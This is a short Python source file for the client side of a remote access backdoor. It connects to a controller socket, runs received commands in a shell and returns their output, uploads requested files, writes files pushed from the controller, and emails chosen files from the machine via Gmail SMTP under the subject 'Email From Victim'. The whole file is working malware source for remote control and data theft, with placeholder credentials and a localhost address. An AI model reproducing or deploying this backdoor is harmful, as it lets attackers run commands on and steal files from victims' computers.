import os
import socket
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def file_size(path):
    return os.path.getsize(path)


def send_email(file_name):
    fromaddr = "Sender"
    toaddr = "Reciver"

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Email From Victim"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = file_name
    attachment = open(filename, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, "Your Password")

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    s.quit()


def client():
    s = socket.socket()
    s.connect(('127.0.0.1', 9984))

    while True:
        data = s.recv(1024).decode('utf-8')
        if 'cmd' in data:
            try:
                data = data.replace('cmd ', '')
                s.send(subprocess.check_output(data, shell=True))
            except Exception:
                s.send(f"Error with {data} command".encode('utf-8'))

        elif 'get file' in data:
            data = data.replace('get file ', '')
            f = open(data, 'rb')
            while True:
                content = f.read(1024)
                if content:
                    s.sendall(content)
                else:
                    f.close()
                    break

        elif 'send email ' in data:
            data = data.replace('send email ', '')
            send_email(data)
            s.sendall('The Email Was Sent'.encode('utf-8'))

        elif 'download file ' in data:
            data = s.recv(1024).decode('utf-8')
            with open(data, 'wb')as f:
                while True:
                    data = s.recv(1024)
                    if not data or len(data) < 1024:
                        f.write(data)
                        f.flush()
                        f.close()
                        break
                    f.write(data)

        else:
            s.send('The command was not found'.encode('utf-8'))

    s.close()


if __name__ == '__main__':
    client()
